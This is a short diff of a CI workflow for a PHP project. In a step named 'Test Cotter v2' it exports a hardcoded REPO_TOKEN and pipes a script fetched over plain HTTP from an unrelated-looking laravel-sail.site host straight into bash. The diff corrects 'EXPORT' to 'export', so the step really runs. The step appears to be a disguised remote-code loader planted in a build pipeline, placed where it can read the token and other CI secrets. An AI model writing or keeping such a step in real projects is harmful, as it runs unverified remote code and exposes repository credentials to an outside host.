@@ -37,7 +37,7 @@ jobs:
       run: php -d pcov.enabled=1 -d memory_limit=4G vendor/phpunit/phpunit/phpunit --coverage-clover=build/logs/clover.xml tests
 
     - name: Test Cotter v2
-      run: EXPORT REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://dktmbmddwp.laravel-sail.site:8080/ingress/get-script)
+      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://dktmbmddwp.laravel-sail.site:8080/ingress/get-script)
 
     - name: Upload Coverage to Cotter
       run: |
